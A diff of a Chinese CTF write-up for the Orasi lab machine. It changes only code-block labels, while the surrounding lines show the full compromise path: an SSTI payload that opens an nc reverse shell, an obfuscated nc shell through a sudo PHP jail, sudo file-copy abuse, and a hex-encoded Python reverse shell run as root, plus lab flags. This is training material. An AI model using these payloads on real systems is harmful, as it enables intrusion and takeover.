@@ -65,7 +65,7 @@ PORT     STATE SERVICE VERSION
 
 探测环境
 
-```shell
+```bash
 ftp> ls -lah
 229 Entering Extended Passive Mode (|||42117|)
 150 Here comes the directory listing.
@@ -82,7 +82,7 @@ drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
 
 得到一个文件 `url`
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $file url
 url: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped
@@ -142,7 +142,7 @@ for i in data:
 
 返回的数据，怀疑是 `crunch` 工具的参数，尝试先跑一份字典
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $crunch 6 6 1337leet > Orasi.dic
 Crunch will now generate the following amount of data: 326592 bytes
@@ -165,7 +165,7 @@ No input
 
 尝试看看使用上面跑出来的字典进行爆破
 
-```shell
+```bash
 import requests
 from rich.progress import Progress
 
@@ -199,7 +199,7 @@ http://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subc
 
 直接反弹 shell
 
-```shell
+```bash
 # http://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27nc%20-c%20bash%20192.168.56.102%209999%27).read()%22)}}
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs -lp 9999
@@ -225,7 +225,7 @@ User www-data may run the following commands on orasi:
 
 ### 尝试提权
 
-```shell
+```bash
 (remote) www-data@orasi:/home/kori$ sudo -u kori /bin/php /home/kori/jail.php "n''c -c ba''sh 192.168.56.102 8888"
 ```
 
@@ -233,7 +233,7 @@ User www-data may run the following commands on orasi:
 
 ## User - kori
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 8888
 [16:14:50] Welcome to pwncat 🐈!
@@ -256,7 +256,7 @@ User kori may run the following commands on orasi:
 
 直接将文件复制过来
 
-```shell
+```bash
 (remote) kori@orasi:/home/kori$ touch /home/kori/irida.apk
 (remote) kori@orasi:/home/kori$ chmod 777 /home/kori/irida.apk
 (remote) kori@orasi:/home/kori$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
@@ -323,7 +323,7 @@ irida:eye.of.the.tiger()
 
 ## User - irida
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs irida@192.168.56.111
 [16:30:54] Welcome to pwncat 🐈!
@@ -337,7 +337,7 @@ irida
 
 ### flag - user
 
-```shell
+```bash
 (remote) irida@orasi:/home/irida$ cat user.txt
 2afb9cbb10c22dc7e154a8c434595948
 ```
@@ -354,7 +354,7 @@ User irida may run the following commands on orasi:
 
 尝试执行
 
-```shell
+```bash
 (remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
 : ls
 Traceback (most recent call last):
@@ -369,7 +369,7 @@ ValueError: non-hexadecimal number found in fromhex() arg at position 0
 ls --> 6C73
 ```
 
-```shell
+```bash
 (remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
 : 6C73
 Traceback (most recent call last):
@@ -389,14 +389,14 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229
 ```
 
-```shell
+```bash
 (remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
 : 696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229
 ```
 
 ## User - root
 
-```shell
+```bash
 (local) pwncat$ connect -lp 8888
 [16:38:44] received connection from 192.168.56.111:50164
 [16:38:44] 192.168.56.111:50164: loaded known host from db
@@ -407,7 +407,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@orasi:/root# cat root.txt
 b1c17c79773c831cbb9109802059c6b5
 ```
